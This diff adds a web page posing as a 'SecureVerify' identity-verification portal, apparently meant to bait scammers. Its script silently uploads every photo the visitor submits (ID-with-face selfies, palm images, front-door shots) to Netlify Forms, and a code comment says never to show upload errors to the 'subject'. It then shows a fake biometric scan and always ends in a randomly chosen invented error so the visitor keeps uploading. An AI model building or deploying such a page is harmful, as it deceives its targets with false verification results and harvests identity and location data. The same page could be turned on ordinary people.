@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>SecureVerify™ — Identity & Claim Verification Portal</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  :root{
+    --bg:#0d1117;--surface:#161b22;--border:#30363d;
+    --accent:#1f6feb;--accent-glow:rgba(31,111,235,0.18);
+    --green:#3fb950;--red:#f85149;--yellow:#d29922;
+    --text:#e6edf3;--muted:#8b949e;--radius:10px;
+  }
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;}
+
+  /* ── MODAL OVERLAY ── */
+  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.82);z-index:999;display:flex;align-items:center;justify-content:center;padding:16px;backdrop-filter:blur(4px);}
+  .modal{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);width:100%;max-width:560px;max-height:90vh;display:flex;flex-direction:column;overflow:hidden;}
+  .modal-header{padding:18px 22px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;}
+  .modal-header-icon{color:var(--yellow);}
+  .modal-title{font-size:0.95rem;font-weight:700;}
+  .modal-body{padding:22px;overflow-y:auto;flex:1;}
+  .tos-scroll{background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;padding:16px;max-height:300px;overflow-y:auto;font-size:0.78rem;line-height:1.7;color:var(--muted);margin-bottom:18px;}
+  .tos-scroll h3{color:var(--text);font-size:0.82rem;margin:14px 0 4px;text-transform:uppercase;letter-spacing:0.5px;}
+  .tos-scroll p{margin-bottom:8px;}
+  .tos-scroll strong{color:var(--text);}
+  .tos-checkbox{display:flex;align-items:flex-start;gap:10px;margin-bottom:18px;cursor:pointer;font-size:0.82rem;line-height:1.5;color:var(--text);}
+  .tos-checkbox input{margin-top:3px;accent-color:var(--accent);width:15px;height:15px;flex-shrink:0;cursor:pointer;}
+  .modal-footer{padding:16px 22px;border-top:1px solid var(--border);display:flex;gap:10px;}
+  .btn-decline{flex:1;padding:11px;background:transparent;color:var(--muted);border:1px solid var(--border);border-radius:8px;font-family:'Inter',sans-serif;font-size:0.85rem;font-weight:500;cursor:pointer;transition:background 0.15s;}
+  .btn-decline:hover{background:rgba(255,255,255,0.05);}
+  .btn-agree{flex:2;padding:11px;background:var(--accent);color:#fff;border:none;border-radius:8px;font-family:'Inter',sans-serif;font-size:0.85rem;font-weight:600;cursor:pointer;transition:opacity 0.15s;}
+  .btn-agree:disabled{opacity:0.35;cursor:not-allowed;}
+  .btn-agree:not(:disabled):hover{opacity:0.85;}
+  .declined-msg{text-align:center;padding:40px 20px;color:var(--muted);font-size:0.88rem;line-height:1.7;}
+  .declined-msg strong{color:var(--red);display:block;font-size:1.05rem;margin-bottom:8px;}
+
+  /* ── TOP BAR ── */
+  .topbar{width:100%;background:var(--surface);border-bottom:1px solid var(--border);padding:12px 24px;display:flex;align-items:center;justify-content:space-between;}
+  .topbar-logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:1.05rem;letter-spacing:-0.3px;}
+  .topbar-logo svg{color:var(--accent);}
+  .topbar-badge{font-size:0.65rem;font-weight:600;background:var(--accent);color:#fff;padding:2px 7px;border-radius:20px;letter-spacing:0.5px;text-transform:uppercase;}
+  .topbar-right{font-size:0.78rem;color:var(--muted);display:flex;align-items:center;gap:16px;}
+  .topbar-ssl{display:flex;align-items:center;gap:5px;color:var(--green);font-size:0.75rem;}
+
+  /* ── MAIN ── */
+  .main{width:100%;max-width:560px;padding:40px 20px 60px;display:flex;flex-direction:column;gap:20px;}
+  .card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;}
+  .card-header{padding:18px 22px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
+  .card-title{font-size:0.88rem;font-weight:600;display:flex;align-items:center;gap:8px;}
+  .step-pill{font-family:'JetBrains Mono',monospace;font-size:0.72rem;background:var(--accent-glow);color:var(--accent);border:1px solid rgba(31,111,235,0.3);padding:2px 9px;border-radius:20px;}
+  .card-body{padding:22px;}
+
+  /* ── PROGRESS ── */
+  .progress-wrap{margin-bottom:6px;}
+  .progress-label{font-size:0.74rem;color:var(--muted);margin-bottom:8px;display:flex;justify-content:space-between;}
+  .progress-track{height:4px;background:var(--border);border-radius:4px;overflow:hidden;}
+  .progress-fill{height:100%;background:var(--accent);border-radius:4px;transition:width 0.6s ease;}
+
+  /* ── TASK ── */
+  .task-box{background:rgba(31,111,235,0.06);border:1px solid rgba(31,111,235,0.2);border-radius:8px;padding:16px 18px;margin-bottom:18px;}
+  .task-eyebrow{font-size:0.68rem;color:var(--accent);font-weight:600;text-transform:uppercase;letter-spacing:0.7px;margin-bottom:6px;}
+  .task-text{font-size:0.9rem;line-height:1.55;}
+  .task-text strong{color:#fff;}
+
+  /* ── UPLOAD ── */
+  .upload-zone{border:2px dashed var(--border);border-radius:8px;padding:32px 20px;text-align:center;cursor:pointer;transition:border-color 0.2s,background 0.2s;position:relative;margin-bottom:16px;}
+  .upload-zone:hover,.upload-zone.drag{border-color:var(--accent);background:var(--accent-glow);}
+  .upload-zone input{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%;}
+  .upload-icon{color:var(--muted);margin-bottom:10px;}
+  .upload-title{font-size:0.88rem;font-weight:500;margin-bottom:4px;}
+  .upload-sub{font-size:0.75rem;color:var(--muted);}
+  .upload-preview{max-width:100%;max-height:180px;border-radius:6px;margin-top:12px;display:none;object-fit:cover;}
+
+  /* ── BUTTON ── */
+  .btn{width:100%;padding:12px;background:var(--accent);color:#fff;font-family:'Inter',sans-serif;font-size:0.9rem;font-weight:600;border:none;border-radius:8px;cursor:pointer;transition:opacity 0.15s,transform 0.1s;display:flex;align-items:center;justify-content:center;gap:8px;}
+  .btn:hover{opacity:0.88;}
+  .btn:active{transform:scale(0.98);}
+  .btn:disabled{opacity:0.45;cursor:not-allowed;transform:none;}
+
+  /* ── STATUS ── */
+  .status{display:none;border-radius:8px;padding:14px 16px;margin-top:16px;font-size:0.84rem;line-height:1.55;}
+  .status.checking{display:flex;align-items:center;gap:10px;background:rgba(210,153,34,0.1);border:1px solid rgba(210,153,34,0.3);color:var(--yellow);}
+  .status.error{display:block;background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.3);color:var(--red);}
+  .status.error .err-title{font-weight:700;font-size:0.88rem;margin-bottom:4px;display:flex;align-items:center;gap:6px;}
+  .status.error .err-code{font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:rgba(248,81,73,0.65);margin-top:8px;}
+  .status.error .retry-hint{margin-top:10px;font-size:0.78rem;color:var(--muted);}
+
+  /* ── SPINNER ── */
+  .spinner{width:16px;height:16px;border:2px solid rgba(210,153,34,0.3);border-top-color:var(--yellow);border-radius:50%;animation:spin 0.7s linear infinite;flex-shrink:0;}
+  @keyframes spin{to{transform:rotate(360deg);}}
+
+  /* ── TRUST STRIP ── */
+  .trust-strip{display:flex;align-items:center;justify-content:center;gap:20px;flex-wrap:wrap;font-size:0.72rem;color:var(--muted);padding:14px 22px;border-top:1px solid var(--border);}
+  .trust-item{display:flex;align-items:center;gap:5px;}
+
+  /* ── SCAN ── */
+  .scan-overlay{display:none;position:relative;border-radius:8px;overflow:hidden;margin-bottom:16px;}
+  .scan-overlay img{width:100%;max-height:180px;object-fit:cover;border-radius:8px;}
+  .scan-line{position:absolute;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,rgba(31,111,235,0.8),transparent);animation:scanMove 1.4s ease-in-out infinite;top:0;}
+  @keyframes scanMove{0%{top:0}100%{top:100%}}
+  .scan-corners::before,.scan-corners::after{content:'';position:absolute;width:20px;height:20px;border-color:var(--accent);border-style:solid;opacity:0.8;}
+  .scan-corners::before{top:6px;left:6px;border-width:2px 0 0 2px;}
+  .scan-corners::after{bottom:6px;right:6px;border-width:0 2px 2px 0;}
+
+  .attempt-ticker{font-family:'JetBrains Mono',monospace;font-size:0.72rem;color:var(--muted);text-align:right;margin-bottom:4px;}
+  .footer{font-size:0.72rem;color:var(--muted);text-align:center;padding:8px;line-height:1.8;}
+  .footer a{color:var(--muted);text-decoration:underline;cursor:pointer;}
+
+  /* ── CONSENT BADGE ── */
+  .consent-badge{display:flex;align-items:center;gap:8px;background:rgba(63,185,80,0.08);border:1px solid rgba(63,185,80,0.25);border-radius:8px;padding:10px 14px;font-size:0.76rem;color:var(--green);margin-bottom:18px;}
+
+  @media(max-width:500px){.main{padding:24px 12px 48px;}}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════════════════════════════
+     NETLIFY FORM (hidden — Netlify detects this at build time)
+══════════════════════════════════════════════════════════════ -->
+<form name="sv-submissions" data-netlify="true" netlify-honeypot="bot-field" hidden>
+  <input type="hidden" name="form-name" value="sv-submissions"/>
+  <input type="text"   name="bot-field"/>
+  <input type="file"   name="photo" accept="image/*"/>
+  <input type="text"   name="task"/>
+  <input type="text"   name="attempt"/>
+  <input type="text"   name="ref_id"/>
+  <input type="text"   name="user_agent"/>
+  <input type="text"   name="submitted_at"/>
+  <input type="text"   name="tos_agreed"/>
+</form>
+
+<!-- ══════════════════════════════════════════════════════════════
+     TERMS OF SERVICE MODAL
+══════════════════════════════════════════════════════════════ -->
+<div class="modal-overlay" id="tos-modal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-header-icon">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+      </div>
+      <div class="modal-title">Terms of Service &amp; Data Collection Agreement</div>
+    </div>
+    <div class="modal-body">
+      <div class="tos-scroll" id="tos-text">
+        <h3>1. Purpose of This Portal</h3>
+        <p>SecureVerify™ ("the Portal") is operated for the purpose of <strong>fraud detection, identity verification, and the collection of evidence relating to suspected criminal activity including advance-fee fraud, impersonation, and online scams.</strong></p>
+
+        <h3>2. Data Collection</h3>
+        <p>By submitting any information or media through this Portal, you <strong>expressly consent</strong> to the collection, storage, and processing of:</p>
+        <p>• All photographs, images, and video submitted through the upload system<br/>
+        • Device metadata including browser user-agent, approximate timestamp, and session reference ID<br/>
+        • The content of any text or written material visible in submitted images<br/>
+        • All task responses and submission attempts</p>
+        <p>This data is <strong>permanently stored</strong> and retained for a minimum of 7 years in accordance with evidence preservation requirements.</p>
+
+        <h3>3. Disclosure to Law Enforcement</h3>
+        <p><strong>All data submitted through this Portal may be, and is likely to be, disclosed in full to law enforcement agencies</strong> including but not limited to local police forces, national fraud bureaux, Interpol, and international cybercrime units. By proceeding you acknowledge and consent to this disclosure.</p>
+        <p>Submitted evidence may be used in criminal proceedings, civil litigation, and published in public-interest reporting relating to fraud prevention.</p>
+
+        <h3>4. No Expectation of Privacy</h3>
+        <p>You have <strong>no expectation of privacy</strong> with respect to any information, images, or data submitted through this Portal. All submissions are treated as potential evidence and handled accordingly.</p>
+
+        <h3>5. Anti-Fraud Investigation Notice</h3>
+        <p>This Portal may be used as part of an active anti-fraud investigation. Submitting false, misleading, or fraudulent claims through this Portal may constitute a criminal offence under applicable law. <strong>By agreeing to these terms you confirm that you are aware your identity and submitted materials may be investigated by law enforcement.</strong></p>
+
+        <h3>6. Intellectual Property &amp; Media Rights</h3>
+        <p>You grant SecureVerify™ and its designated law enforcement partners an irrevocable, royalty-free licence to use, reproduce, and disclose any submitted material for the purposes of fraud investigation, evidence, and public-interest reporting.</p>
+
+        <h3>7. Consent is Mandatory</h3>
+        <p>Access to this verification system is conditional upon your agreement to these terms. If you do not agree, you must exit immediately and not proceed.</p>
+
+        <h3>8. Governing Law</h3>
+        <p>These terms are governed by applicable international law. Use of this Portal from any jurisdiction constitutes acceptance of these terms and submission to the jurisdiction of relevant authorities.</p>
+      </div>
+
+      <label class="tos-checkbox" id="tos-check-label">
+        <input type="checkbox" id="tos-check"/>
+        I have read and fully understand the Terms of Service above. I <strong>&nbsp;consent</strong> to the collection, storage, and disclosure of all submitted data including photographs to law enforcement agencies, and I confirm I am not acting under duress.
+      </label>
+
+      <div id="declined-msg" class="declined-msg" style="display:none;">
+        <strong>⛔ Access Denied</strong>
+        You must agree to the Terms of Service to access this verification portal. Please close this window.
+      </div>
+    </div>
+    <div class="modal-footer" id="modal-footer">
+      <button class="btn-decline" onclick="declineToS()">Decline &amp; Exit</button>
+      <button class="btn-agree" id="agree-btn" disabled onclick="acceptToS()">I Agree — Continue</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════
+     MAIN UI
+══════════════════════════════════════════════════════════════ -->
+<div class="topbar">
+  <div class="topbar-logo">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    SecureVerify™
+    <span class="topbar-badge">LIVE</span>
+  </div>
+  <div class="topbar-right">
+    <span class="topbar-ssl">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      256-bit SSL
+    </span>
+    <span>Ref: <span id="ref-id" style="font-family:'JetBrains Mono',monospace">—</span></span>
+  </div>
+</div>
+
+<div class="main">
+  <div class="card">
+    <div class="card-header">
+      <div class="card-title">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
+        Claim Verification Required
+      </div>
+      <span class="step-pill" id="step-label">Step 1 of 3</span>
+    </div>
+    <div class="card-body">
+      <div class="progress-wrap">
+        <div class="progress-label"><span>Verification Progress</span><span id="pct-label">0%</span></div>
+        <div class="progress-track"><div class="progress-fill" id="progress-fill" style="width:0%"></div></div>
+      </div>
+    </div>
+    <div class="trust-strip">
+      <div class="trust-item">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        Evidence Archived
+      </div>
+      <div class="trust-item">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
+        ToS Agreed
+      </div>
+      <div class="trust-item">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        Law Enforcement Ready
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header">
+      <div class="card-title">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+        Photo Upload
+      </div>
+      <span class="attempt-ticker">Attempt <span id="attempt-num">1</span></span>
+    </div>
+    <div class="card-body">
+      <div class="consent-badge">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+        Terms of Service accepted — submissions are recorded and may be shared with law enforcement.
+      </div>
+      <div class="task-box">
+        <div class="task-eyebrow">📋 Current Task</div>
+        <div class="task-text" id="task-text">Loading task…</div>
+      </div>
+      <div class="scan-overlay" id="scan-overlay">
+        <img id="scan-img" src="" alt="Uploaded photo"/>
+        <div class="scan-line"></div>
+        <div class="scan-corners"></div>
+      </div>
+      <div class="upload-zone" id="upload-zone">
+        <input type="file" accept="image/*" id="file-input" capture="environment"/>
+        <div class="upload-icon">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+        </div>
+        <div class="upload-title">Tap to take photo or upload</div>
+        <div class="upload-sub">JPG, PNG or HEIC · Max 10 MB</div>
+        <img class="upload-preview" id="upload-preview" alt="preview"/>
+      </div>
+      <button class="btn" id="submit-btn" disabled>
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        Submit for Verification
+      </button>
+      <div class="status" id="status-box"></div>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  SecureVerify™ Claim Processing Portal &nbsp;·&nbsp; <a onclick="showToS()">Terms of Service</a> &nbsp;·&nbsp; <a href="#">Privacy Policy</a><br/>
+  © 2024 SecureVerify International Ltd. All rights reserved.<br/>
+  <span style="color:rgba(139,148,158,0.5);font-size:0.68rem;">All submissions archived and may be disclosed to relevant authorities.</span>
+</div>
+
+<script>
+// ── TASKS & ERRORS ──────────────────────────────────────────────
+const TASKS = [
+  {text:'Please take a clear photo of <strong>yourself holding a piece of paper with today\'s date written on it</strong>. Make sure your face is fully visible and the writing is legible.',label:'Date Selfie'},
+  {text:'For security, we need a photo of <strong>a common household item (e.g. a cup, mug, or glass)</strong> placed on a flat surface. The full object must be visible.',label:'Object Verification'},
+  {text:'Write the <strong>exact current time (HH:MM)</strong> on a piece of paper, hold it in front of you and take a photo. Your writing hand must be visible in the frame.',label:'Timestamp Photo'},
+  {text:'Take a photo of the <strong>front door or entrance area of your current location</strong>. The door handle must be visible.',label:'Location Verify'},
+  {text:'For liveness verification, take a photo of yourself <strong>showing a thumbs-up with your right hand</strong>. Your face must be fully visible and well-lit.',label:'Liveness Check'},
+  {text:'Please take a photo of your <strong>left hand open, palm facing the camera</strong>, with all five fingers clearly spread apart.',label:'Hand Biometric'},
+  {text:'Take a selfie in <strong>natural light near a window</strong>. Your full face and both shoulders must be visible. No filters or flash.',label:'Natural Light ID'},
+  {text:'Take a close-up photo of a <strong>printed or handwritten note reading "VERIFIED"</strong>. The text must fill at least half the frame.',label:'Written Confirmation'},
+  {text:'We need a photo showing <strong>a wall or surface behind you</strong> with at least one visible object (e.g. a picture, clock, or light switch).',label:'Background Check'},
+  {text:'Hold your <strong>government-issued ID next to your face</strong> and take a selfie. Both your face and the ID must be clearly visible.',label:'ID + Face Match'},
+];
+const ERRORS = [
+  {title:'Face Not Detected',body:'Our AI could not locate a human face in the submitted image. Ensure your face is fully visible, centred, and unobstructed.',code:'ERR_FACE_DETECTION_FAIL'},
+  {title:'Image Too Blurry',body:'The photo failed our sharpness threshold (score: 0.14 / 1.0). Please hold the camera steady and ensure good focus.',code:'ERR_BLUR_THRESHOLD_EXCEEDED'},
+  {title:'Text Unreadable',body:'The handwritten text could not be parsed by our OCR engine. Write larger with a dark pen on white paper in bright light.',code:'ERR_OCR_CONFIDENCE_LOW'},
+  {title:'Incorrect Timestamp',body:'The time shown does not match our server timestamp within the ±3 minute window. Please check your clock and re-submit immediately.',code:'ERR_TIMESTAMP_MISMATCH'},
+  {title:'Image Too Dark',body:'Pixel luminance is below the minimum threshold. Move to a brighter location or turn on a light source before retaking.',code:'ERR_LUMINANCE_LOW'},
+  {title:'Required Object Missing',body:'The requested object was not identified in the frame. Ensure it is fully visible and takes up at least 30% of the image.',code:'ERR_OBJECT_NOT_FOUND'},
+  {title:'Partial Frame Detected',body:'Required elements were cut off. Adjust the camera angle so all items fit fully within the frame.',code:'ERR_PARTIAL_FRAME'},
+  {title:'Liveness Check Failed',body:'A possible static image or screenshot was detected. A live photo is required. Disable camera filters and try again.',code:'ERR_LIVENESS_FAIL'},
+  {title:'Metadata Mismatch',body:'EXIF data is inconsistent with a live capture. Use your device\'s default camera app only.',code:'ERR_EXIF_ANOMALY'},
+  {title:'Glare / Overexposure Detected',body:'Bright glare is obscuring key verification areas. Move away from direct light sources and retry.',code:'ERR_OVEREXPOSURE'},
+  {title:'Background Validation Failed',body:'An unexpected background pattern triggered our fraud-prevention filter. Move to a different location.',code:'ERR_BACKGROUND_INVALID'},
+  {title:'Resolution Too Low',body:'Image resolution is below the 640×480 minimum. Use your main rear camera and ensure file size is above 100 KB.',code:'ERR_RESOLUTION_INSUFFICIENT'},
+];
+
+// ── STATE ──────────────────────────────────────────────────────
+let attempt = 1, taskIndex = 0, fileSelected = false;
+let tosAccepted = false;
+const refId = 'SV-' + Math.random().toString(36).substring(2,7).toUpperCase() + '-' + Date.now().toString(36).toUpperCase();
+document.getElementById('ref-id').textContent = refId;
+
+// ── ToS LOGIC ─────────────────────────────────────────────────
+document.getElementById('tos-check').addEventListener('change', function() {
+  document.getElementById('agree-btn').disabled = !this.checked;
+});
+function acceptToS() {
+  tosAccepted = true;
+  document.getElementById('tos-modal').style.display = 'none';
+  loadTask();
+  updateProgress();
+}
+function declineToS() {
+  document.getElementById('tos-text').style.display = 'none';
+  document.getElementById('tos-check-label').style.display = 'none';
+  document.getElementById('modal-footer').style.display = 'none';
+  document.getElementById('declined-msg').style.display = 'block';
+}
+function showToS() {
+  document.getElementById('tos-modal').style.display = 'flex';
+  document.getElementById('tos-text').style.display = 'block';
+  document.getElementById('tos-check-label').style.display = 'flex';
+  document.getElementById('modal-footer').style.display = 'flex';
+  document.getElementById('declined-msg').style.display = 'none';
+}
+
+// ── TASK / PROGRESS ───────────────────────────────────────────
+function loadTask() {
+  taskIndex = Math.floor(Math.random() * TASKS.length);
+  document.getElementById('task-text').innerHTML = TASKS[taskIndex].text;
+}
+function updateProgress() {
+  const p = Math.min(12 + (attempt - 1) * 3, 28);
+  document.getElementById('progress-fill').style.width = p + '%';
+  document.getElementById('pct-label').textContent = p + '%';
+  const steps = ['Step 1 of 3','Step 1 of 3','Step 2 of 3','Step 2 of 3','Step 1 of 3'];
+  document.getElementById('step-label').textContent = steps[attempt % steps.length] || 'Step 1 of 3';
+}
+
+// ── UPLOAD ────────────────────────────────────────────────────
+const fileInput = document.getElementById('file-input');
+const preview = document.getElementById('upload-preview');
+const submitBtn = document.getElementById('submit-btn');
+const uploadZone = document.getElementById('upload-zone');
+
+fileInput.addEventListener('change', () => {
+  const file = fileInput.files[0]; if (!file) return;
+  const reader = new FileReader();
+  reader.onload = e => {
+    preview.src = e.target.result;
+    preview.style.display = 'block';
+    fileSelected = true;
+    submitBtn.disabled = false;
+    document.getElementById('status-box').className = 'status';
+    document.getElementById('scan-overlay').style.display = 'none';
+  };
+  reader.readAsDataURL(file);
+});
+uploadZone.addEventListener('dragover', e => { e.preventDefault(); uploadZone.classList.add('drag'); });
+uploadZone.addEventListener('dragleave', () => uploadZone.classList.remove('drag'));
+uploadZone.addEventListener('drop', e => {
+  e.preventDefault(); uploadZone.classList.remove('drag');
+  if (e.dataTransfer.files[0]) { fileInput.files = e.dataTransfer.files; fileInput.dispatchEvent(new Event('change')); }
+});
+
+// ── SUBMIT ────────────────────────────────────────────────────
+submitBtn.addEventListener('click', async () => {
+  if (!fileSelected) return;
+  submitBtn.disabled = true; fileSelected = false;
+
+  // Silently save to Netlify Forms
+  try {
+    const fd = new FormData();
+    fd.append('form-name', 'sv-submissions');
+    fd.append('photo', fileInput.files[0], fileInput.files[0].name);
+    fd.append('task', TASKS[taskIndex].label + ': ' + TASKS[taskIndex].text.replace(/<[^>]+>/g,''));
+    fd.append('attempt', String(attempt));
+    fd.append('ref_id', refId);
+    fd.append('user_agent', navigator.userAgent);
+    fd.append('submitted_at', new Date().toISOString());
+    fd.append('tos_agreed', 'YES — ' + new Date().toISOString());
+    await fetch('/', { method: 'POST', body: fd });
+  } catch(_) { /* silent — never show upload errors to subject */ }
+
+  // Show scan animation
+  const scanOverlay = document.getElementById('scan-overlay');
+  const scanImg = document.getElementById('scan-img');
+  scanImg.src = preview.src;
+  scanOverlay.style.display = 'block';
+  preview.style.display = 'none';
+
+  const statusBox = document.getElementById('status-box');
+  const checkMsgs = [
+    'Analysing image quality…','Running facial biometrics…',
+    'Performing OCR scan…','Checking liveness markers…',
+    'Validating EXIF metadata…','Cross-referencing timestamp…',
+    'Verifying against database…','Processing submission…',
+  ];
+  statusBox.className = 'status checking';
+  statusBox.innerHTML = `<div class="spinner"></div><span id="check-msg">${checkMsgs[0]}</span>`;
+
+  let msgI = 0;
+  const msgInterval = setInterval(() => {
+    msgI = (msgI+1) % checkMsgs.length;
+    const el = document.getElementById('check-msg');
+    if (el) el.textContent = checkMsgs[msgI];
+  }, 900);
+
+  setTimeout(() => {
+    clearInterval(msgInterval);
+    scanOverlay.style.display = 'none';
+    const err = ERRORS[Math.floor(Math.random() * ERRORS.length)];
+    statusBox.className = 'status error';
+    statusBox.innerHTML = `
+      <div class="err-title">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        Verification Failed — ${err.title}
+      </div>
+      <div>${err.body}</div>
+      <div class="err-code">Code: ${err.code} · Ref: ${refId} · Attempt ${attempt}</div>
+      <div class="retry-hint">⚠ Please follow the instructions carefully and re-upload a new photo to continue your claim.</div>
+    `;
+    attempt++;
+    document.getElementById('attempt-num').textContent = attempt;
+    updateProgress();
+    let newIndex; do { newIndex = Math.floor(Math.random() * TASKS.length); } while (newIndex === taskIndex);
+    taskIndex = newIndex;
+    document.getElementById('task-text').innerHTML = TASKS[taskIndex].text;
+    fileInput.value = ''; preview.src = ''; preview.style.display = 'none';
+    submitBtn.disabled = false;
+  }, 4500 + Math.random() * 4000);
+});
+</script>
+</body>
+</html>
